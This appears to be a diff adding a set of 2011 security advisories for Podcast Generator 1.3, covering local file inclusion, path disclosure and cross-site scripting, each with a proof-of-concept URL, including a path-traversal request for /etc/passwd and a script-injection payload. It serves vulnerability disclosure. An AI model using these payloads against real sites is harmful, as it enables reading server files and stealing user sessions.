@@ -1,0 +1,55 @@
+========================================
+Vulnerability ID: HTB22801
+Reference: http://www.htbridge.ch/advisory/local_file_inclusion_in_podcast_generator.html
+Product: Podcast Generator
+Vendor: Alberto Betella ( http://podcastgen.sourceforge.net/ ) 
+Vulnerable Version: 1.3
+Vendor Notification: 20 January 2011 
+Vulnerability Type: Local File Inclusion
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/core/language.php" script to properly sanitize user-supplied input in "scriptlang" variable.
+
+
+http://[home]/core/language.php?scriptlang=../../../../../../../../etc/passwd%00
+
+
+========================================
+Vulnerability ID: HTB22800
+Reference: http://www.htbridge.ch/advisory/path_disclosure_in_podcast_generator.html
+Product: Podcast Generator
+Vendor: Alberto Betella ( http://podcastgen.sourceforge.net/ ) 
+Vulnerable Version: 1.3
+Vendor Notification: 20 January 2011 
+Vulnerability Type: Path disclosure
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/core/episode.php" script to properly sanitize user-supplied input in "name" variable, it's possible to generate an error that will reveal the full path of the script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+
+http://[host]/core/episode.php?name=../config.php
+
+Vulnerability ID: HTB22802
+Reference: http://www.htbridge.ch/advisory/xss_in_podcast_generator.html
+Product: Podcast Generator
+Vendor: Alberto Betella ( http://podcastgen.sourceforge.net/ )
+Vulnerable Version: 1.3
+Vendor Notification: 20 January 2011
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+The vulnerability exists due to failure in the "/core/themes.php" script to properly sanitize user-supplied input in "L_failedopentheme" variable when register_globals is on.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+http://[host]/core/themes.php?L_failedopentheme=%3Cscript%3Ealert%28%22X
+SS%22%29;%3C/script%3E
